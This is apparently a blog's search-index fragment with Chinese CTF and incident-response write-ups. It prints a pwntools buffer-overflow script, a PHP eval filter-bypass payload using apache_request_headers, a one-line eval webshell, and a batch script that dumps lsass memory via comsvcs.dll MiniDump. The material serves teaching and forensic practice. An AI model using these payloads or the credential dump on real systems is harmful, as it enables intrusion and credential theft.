src="/../images/image-20250817155853433.png" alt="image-20250817155853433"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./attachment&#x27;)</span><br><span class="line">#p = remote(&quot;127.0.0.1&quot;, 9999)</span><br><span class="line">payload = b&#x27;a&#x27; * 76 + p32(0x080491B6)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250817164600305.png" alt="image-20250817164600305"></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>web都是docker拉下来的 flag是自己填上去的 都一样的 </p><h4 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint：fuzz部分需要爆破http://x.x.x.x/的路径，六位数</span><br></pre></td></tr></table></figure><p>进来是一个空白页面 查看源代码 访问下一级目录</p><p><img src="/../images/image-20250824141424090.png" alt="image-20250824141424090"></p><p>进来提示爆破数字组的目录 使用burp爆破一手 六位数 </p><p><img src="/../images/image-20250824141505057.png" alt="image-20250824141505057"></p><p><img src="/../images/image-20250824142613374.png" alt="image-20250824142613374"></p><p><img src="/../images/image-20250824142657740.png" alt="image-20250824142657740"></p><p>跟burp一样爆破参数名 当访问name?&#x3D;1的时候 发现页面更改了 flask+python 打一套ssti</p><p><img src="/../images/image-20250824142949912.png" alt="image-20250824142949912"></p><p><img src="/../images/image-20250824144022280.png" alt="image-20250824144022280"></p><h4 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h4><p>这是一题绕过滤rce题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|implode|phpinfo|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|session_id|session_start|echo|readfile|highlight|show|source|file|assert/i&quot;</span>, <span class="variable">$test</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$test</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;oh nonono hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure><p>过滤了很多运行的命令字符 但是没有过滤system 可以用system来执行命令 发现被禁了getallheaders 但是有别名apache_request_headers()的字符可以使用 end可以使用join使用</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getallheaders()</span><br><span class="line">getallheaders()返回当前请求的所有请求头信息，局限于Apache（apache_request_headers()和getallheaders()功能相似，可互相替代，不过也是局限于Apache）</span><br><span class="line">当确定能够返回时，我们就能在数据包最后一行加上一个请求头，写入恶意代码，再用end()函数指向最后一个请求头，使其执行，payload：</span><br><span class="line">var_dump(end(getallheaders()));</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250824153315095.png" alt="image-20250824153315095"></p><p><img src="/../images/image-20250824153733382.png" alt="image-20250824153733382"></p><p>system(join(apache_request_headers()))；</p><p><img src="/../images/image-20250824154125855.png" alt="image-20250824154125855"></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025年Solar应急响应公益月赛7月--复盘</title>
      <link href="/posts/3233.html"/>
      <url>/posts/3233.html</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/1.png"></p><p>这一次比六月题量多了，取证和应急1没连贯上，用了很多时间后面没做，还得继续沉淀</p><p>学习一下n0o0b神的wp，复盘一手：<a href="https://www.n0o0b.com/archives/solar-7">2025年Solar应急响应公益月赛-7月|n0o0b’s blog</a>。官方解可以去solar公众号食取</p><p>做取证的的时候，还是用 volatility2在乱找,相对来说lovelymem真是好用，Tokeii0神:<a href="https://github.com/Tokeii0/LovelyMem">https://github.com/Tokeii0/LovelyMem</a></p><p>总结：要很多新的知识点，很nice，自己做的时候和复盘排查思路不一样，还是得多总结多学习</p><h2 id="题目信息—–VOL-EASY"><a href="#题目信息—–VOL-EASY" class="headerlink" title="题目信息—–VOL_EASY"></a>题目信息—–VOL_EASY</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">某企业服务器近日遭受隐秘入侵。安全团队通过日志溯源发现，黑客利用Web应用漏洞植入恶意后门，根据溯源的信息配合警方逮捕了黑客，安全团队已经紧急保存了黑客电脑的内存转储文件，请你开始取证以便固定证据。请根据题目文件，找出下面10条证据让罪犯服软吧！</span><br></pre></td></tr></table></figure><h3 id="【任务1】VOL-EASY"><a href="#【任务1】VOL-EASY" class="headerlink" title="【任务1】VOL_EASY"></a>【任务1】VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目信息：</span><br><span class="line">黑客上传的一句话木马密码是多少？</span><br></pre></td></tr></table></figure><p>lovelymem导入镜像，timeline_ntfs发现ezshell.php，右键打开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">知识点：NTFS日志会记录NTFS文件系统中文件的创建、修改、增加数据、删除等操作执行的时间</span><br></pre></td></tr></table></figure><p><img src="/../images/2.png" alt="2"></p><p><img src="/../images/image-20250729203044299.png" alt="image-20250729203044299"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;solar&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>flag{solar}</p><h3 id="【任务2】VOL-EASY"><a href="#【任务2】VOL-EASY" class="headerlink" title="【任务2】VOL_EASY"></a>【任务2】VOL_EASY</h3><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客使用的木马连接工具叫什么（比如xx.exe）？(仅首字母大写)</span><br></pre></td></tr></table></figure><p>看下findevil，发现蚁剑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findevil通常指的是通过技术手段检测、定位内存中存在的恶意代码、恶意进程或其他威胁因素的行为或工具功能</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729203833881.png" alt="image-20250729203833881"></p><p>flag{Antsword.exe}</p><h3 id="【任务3】VOL-EASY"><a href="#【任务3】VOL-EASY" class="headerlink" title="【任务3】VOL_EASY"></a>【任务3】VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客使用的木马连接工具的位置在哪里（比如C:\xxxx\xx.exe） ？</span><br></pre></td></tr></table></figure><p>flie直接搜Antsword.exe</p><p><img src="/../images/image-20250729204249198.png" alt="image-20250729204249198"></p><p>flag{C:\Tools\AntSword-Loader-v4.0.3-win32-x64\AntSword.exe}</p><h3 id="【任务4】VOL-EASY"><a href="#【任务4】VOL-EASY" class="headerlink" title="【任务4】VOL_EASY"></a>【任务4】VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客获取到的FLAG是什么？</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729204619083.png" alt="image-20250729204619083"></p><p>flag{ok!get_webshell_is_good_idea~}</p><h3 id="【任务5】VOL-EASY"><a href="#【任务5】VOL-EASY" class="headerlink" title="【任务5】VOL_EASY"></a>【任务5】VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客入侵的网站地址是多少（只需要http://xxxxx/）？</span><br></pre></td></tr></table></figure><p>我这里是想着蚁剑要连，可能是文件上传到目标网站上，所以在浏览器记录上找到的</p><p><img src="/../images/image-20250729210250666.png" alt="image-20250729210250666"></p><p>n0o0b神这里是先扫描了一手网络，然后试了192.228.79.201，不行就直接正则了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">正则表达式 `\d+\.\d+\.\d+\.\d+` ，这个正则表达式用于匹配IPv4 地址</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729205747167.png" alt="image-20250729205747167"></p><p><img src="/../images/image-20250729210758496.png" alt="image-20250729210758496"></p><p>flag{<a href="http://192.168.186.140/%7D">http://192.168.186.140/}</a></p><h3 id="【任务6】VOL-EASY"><a href="#【任务6】VOL-EASY" class="headerlink" title="【任务6】VOL_EASY"></a>【任务6】VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客入侵时，使用的系统用户名是什么？</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729211338146.png" alt="image-20250729211338146"></p><p>flag{Administrator}</p><h3 id="【任务7】VOL-EASY"><a href="#【任务7】VOL-EASY" class="headerlink" title="【任务7】VOL_EASY"></a>【任务7】VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客创建隐藏账户的密码是多少？</span><br></pre></td></tr></table></figure><p>打的时候，从这题开始就没有连贯起来，想着是被攻击机器的信息，不懂了gg</p><p>n0o0b神直接就正则搜net user，然后猜个5</p><p><img src="/../images/image-20250729211844240.png" alt="image-20250729211844240"></p><p>flag{solar2025}</p><h3 id="【任务8-9-10】VOL-EASY"><a href="#【任务8-9-10】VOL-EASY" class="headerlink" title="【任务8,9,10】VOL_EASY"></a>【任务8,9,10】VOL_EASY</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客首次操作靶机的关键程序是什么？</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729212439796.png" alt="image-20250729212439796"></p><p>一开始找ezshell.php，有两个bat文件</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span> [*] 正在获取 lsass.exe PID...</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=<span class="number">2</span> delims=,&quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;tasklist /FI &quot;IMAGENAME eq lsass.exe&quot; /FO CSV /NH&#x27;) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">set</span> PID=<span class="variable">%%~</span>a</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> &quot;<span class="variable">%PID%</span>&quot;==&quot;&quot; (</span><br><span class="line">    <span class="built_in">echo</span> [!] 未找到 lsass.exe 进程，或没有权限。</span><br><span class="line">    <span class="built_in">pause</span></span><br><span class="line">    <span class="keyword">exit</span> /b <span class="number">1</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [*] PID: <span class="variable">%PID%</span></span><br><span class="line"><span class="built_in">echo</span> [*] 正在尝试导出内存转储...</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> OUTPUT=%~dp0lsass.dmp</span><br><span class="line"></span><br><span class="line">rundll32.exe comsvcs.dll, MiniDump <span class="variable">%PID%</span> <span class="variable">%OUTPUT%</span> full</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">exist</span> &quot;<span class="variable">%OUTPUT%</span>&quot; (</span><br><span class="line">    <span class="built_in">echo</span> [✓] 成功导出 lsass 内存为: <span class="variable">%OUTPUT%</span></span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">    <span class="built_in">echo</span> [!] 导出失败，可能权限不足。</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主要功能是导出系统中lsass.exe进程的内存转储文件（lsass.dmp）,lsass.exe是 Windows 系统的本地安全认证子系统进程，负责处理用户登录认证、密码哈希存储等敏感安全信息</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729213256953.png" alt="image-20250729213256953"></p><p>根据程序搜镜像的PID就好了，可以找到pid，文件路劲，直接一波后面三题了</p><h2 id="题目信息—–应急大师"><a href="#题目信息—–应急大师" class="headerlink" title="题目信息—–应急大师"></a>题目信息—–应急大师</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是一台被黑客入侵的服务器，安全团队有进行一些基础溯源。目前服务器已经断网处理，请你继续协助安全团队进行溯源分析，将整个证据链补充完整。</span><br></pre></td></tr></table></figure><p>这也是取证的时候，被入侵的服务器</p><h3 id="【任务1】应急大师"><a href="#【任务1】应急大师" class="headerlink" title="【任务1】应急大师"></a>【任务1】应急大师</h3><p>做的时候，多是直接敲的cmd命令,这么看来还是直接搜事件的id更快一点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请提交隐藏用户的名称？</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729214351239.png" alt="image-20250729214351239"></p><p>好像刚进来就给答案了</p><h3 id="【任务2】应急大师"><a href="#【任务2】应急大师" class="headerlink" title="【任务2】应急大师"></a>【任务2】应急大师</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请提交黑客的IP地址？</span><br></pre></td></tr></table></figure><p>可以由取证哪里知道ip，也可以看phpstudy，nginx日志</p><p>C:&#x2F;phpstudy&#x2F;log&#x2F;nginx_log</p><p><img src="/../images/image-20250729215152539.png" alt="image-20250729215152539"></p><h3 id="【任务3】应急大师"><a href="#【任务3】应急大师" class="headerlink" title="【任务3】应急大师"></a>【任务3】应急大师</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请提交黑客的一句话木马密码？</span><br></pre></td></tr></table></figure><p>可以由取证哪里知道密码，也可以看phpstudy下的文件</p><p>C:&#x2F;phpstudy&#x2F;WWW&#x2F;uploads&#x2F;</p><p><img src="/../images/image-20250729215449413.png" alt="image-20250729215449413"></p><h3 id="【任务4】应急大师"><a href="#【任务4】应急大师" class="headerlink" title="【任务4】应急大师"></a>【任务4】应急大师</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请提交黑客创建隐藏用户的TargetSid（目标账户安全ID）？</span><br></pre></td></tr></table></figure><p>wmic useraccount get name,sid</p><p><img src="/../images/image-20250729215809343.png" alt="image-20250729215809343"></p><h3 id="【任务5】应急大师"><a href="#【任务5】应急大师" class="headerlink" title="【任务5】应急大师"></a>【任务5】应急大师</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请提交黑客创建隐藏账户的事件（格式为 年/月/日 时:分:秒）？</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729220827054.png" alt="image-20250729220827054"></p><p>事件查看器搜创建新账户事件，ID为4720</p><h3 id="【任务6】应急大师"><a href="#【任务6】应急大师" class="headerlink" title="【任务6】应急大师"></a>【任务6】应急大师</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客将这个隐藏用户先后加入了哪几个用户组？提交格式为 第一个用户组-第二个用户组，如student-teacher</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">事件 ID 4728：用户被添加到一个全局安全组</span><br><span class="line">事件 ID 4732：用户被添加到一个本地安全组</span><br><span class="line">事件 ID 4756：用户被添加到一个通用安全组</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729221500496.png" alt="image-20250729221500496"></p><p><img src="/../images/image-20250729221517184.png" alt="image-20250729221517184"></p><p>先后被添加到Users、Administrators组</p><h3 id="【任务7】应急大师"><a href="#【任务7】应急大师" class="headerlink" title="【任务7】应急大师"></a>【任务7】应急大师</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客通过远程桌面成功登陆系统管理员账号的网络地址及端口号？提交格式为 IP:PORT 如 127.0.0.1:41110</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729221843353.png" alt="image-20250729221843353"></p><h2 id="题目信息—–公交车系统攻击事件排查"><a href="#题目信息—–公交车系统攻击事件排查" class="headerlink" title="题目信息—–公交车系统攻击事件排查"></a>题目信息—–公交车系统攻击事件排查</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">思而听公交系统被黑客攻击，黑客通过web进行了攻击并获取了数据，然后获取了其中一位驾校师傅在FTP服务中的私密文件，其后黑客找到了任意文件上传漏洞进行了GETshell，控制了主机权限并植入了挖矿网页挖矿病毒，接下来你需要逐步排查。</span><br></pre></td></tr></table></figure><h3 id="【任务1】公交车系统攻击事件排查"><a href="#【任务1】公交车系统攻击事件排查" class="headerlink" title="【任务1】公交车系统攻击事件排查"></a>【任务1】公交车系统攻击事件排查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分析环境内的中间件日志，找到第一个漏洞(黑客获取数据的漏洞)，然后通过分析日志、流量，通过脚本解出黑客获取的用户密码数据，提交获取的前两个用户名，提交格式：flag&#123;zhangsan-wangli&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729222756742.png" alt="image-20250729222756742"></p><p>进来就是一个流量包，发现是sql注入</p><p><img src="/../images/image-20250729225021003.png" alt="image-20250729225021003"></p><p>连数据库查，按password排序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">show databases;</span><br><span class="line">use bus_system</span><br><span class="line">select * from bus_drivers order by password;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729225151998.png" alt="image-20250729225151998"></p><p>flag{sunyue-chenhao}</p><h3 id="【任务2】公交车系统攻击事件排查"><a href="#【任务2】公交车系统攻击事件排查" class="headerlink" title="【任务2】公交车系统攻击事件排查"></a>【任务2】公交车系统攻击事件排查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黑客通过获取的用户名密码，利用密码复用技术，爆破了FTP服务，分析流量以后找到开放的FTP端口，并找到黑客登录成功后获取的私密文件，提交其文件中内容，提交格式：flag&#123;xxx&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729230321641.png" alt="image-20250729230321641"></p><p>直接find搜索ftp，就出了</p><h3 id="【任务3】公交车系统攻击事件排查"><a href="#【任务3】公交车系统攻击事件排查" class="headerlink" title="【任务3】公交车系统攻击事件排查"></a>【任务3】公交车系统攻击事件排查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可恶的黑客找到了任意文件上传点，你需要分析日志和流量以及web开放的程序找到黑客上传的文件，提交木马使用的密码，提交格式：flag&#123;password&#125;</span><br></pre></td></tr></table></figure><p>因为是文件上传，直接去找upload就好了</p><p><img src="/../images/image-20250729230656019.png" alt="image-20250729230656019"></p><h3 id="【任务4】公交车系统攻击事件排查"><a href="#【任务4】公交车系统攻击事件排查" class="headerlink" title="【任务4】公交车系统攻击事件排查"></a>【任务4】公交车系统攻击事件排查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分析流量，黑客植入了一个web挖矿木马，这个木马现实情况下会在用户访问后消耗用户的资源进行挖矿(本环境已做无害化处理)，提交黑客上传这个文件时的初始名称，提交格式：flag&#123;xxx.xxx&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729232809143.png" alt="image-20250729232809143"></p><p>直接解密webshell就ok了</p><p><img src="/../images/image-20250729234332101.png" alt="image-20250729234332101"></p><p>map.php</p><h3 id="【任务5】公交车系统攻击事件排查"><a href="#【任务5】公交车系统攻击事件排查" class="headerlink" title="【任务5】公交车系统攻击事件排查"></a>【任务5】公交车系统攻击事件排查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分析流量并上机排查，黑客植入的网页挖矿木马所使用的矿池地址是什么，提交矿池地址(排查完毕后可以尝试删除它)提交格式：flag&#123;xxxxxxx.xxxx.xxx:xxxx&#125;</span><br></pre></td></tr></table></figure><p>map.php变成了index.php，去检测一下index.php</p><p><img src="/../images/image-20250729234906085.png" alt="image-20250729234906085"></p><p>混淆js，解密就能获得</p><p>不会很懂加解密，给ai玩一会去</p>]]></content>
      
      
      <categories>
          
          <category> solar应急响应系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>Who am I ?</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<div class="about-container">  <!--- 引言部分 -->  <blockquote class="about-quote">    <p>你好！很高兴能在这里与你相遇。再努力一点，你是不是就会多看我一眼</p>  </blockquote>  <!--- 基本信息 -->  <div class="note note-primary">    <h2>love me</h2>    <ul>      <li><strong>坐标：</strong>你的心里</li>      <li><strong>身份：</strong>24级在读大学生</li>      <li><strong>id：</strong>cyl_love&陈羽琳</li>      <li><strong>邮箱：</strong>3537049752@qq.com</li>      <li>迷路在web中，欢迎扩列交流</li>            </ul>  </div></div><style>/* 整体容器 */.about-container {  max-width: 800px;  margin: 2rem auto;  padding: 0 1rem;}/* 引言样式 */.about-quote {  border-left: 4px solid #6f42c1;  padding-left: 1rem;  margin: 2rem 0;  font-style: italic;  color: #666;}/* 通用便签样式 */.note {  margin: 2.5rem 0;  padding: 1.5rem;  border-left: 4px solid;  border-radius: 4px;  background: #f8f9fa;}.note-primary { border-left-color: #6f42c1; background: #f5f0fa; }.note-info { border-left-color: #428bca; background: #eef7fa; }.note-success { border-left-color: #5cb85c; background: #eff8f0; }.note-warning { border-left-color: #f0ad4e; background: #fcf8f2; }.note h2 {  margin-top: 0;  color: #333;}.note ul {  padding-left: 1.2rem;}.note li {  margin-bottom: 0.5rem;}/* 社交链接样式 */.social-links a {  display: inline-block;  margin-right: 1rem;  margin-bottom: 0.5rem;  padding: 0.4rem 0.8rem;  background: #6f42c1;  color: white !important;  text-decoration: none;  border-radius: 4px;  transition: background 0.3s;}.social-links a:hover {  background: #5a32a3;  text-decoration: none;}</style>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>friend</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
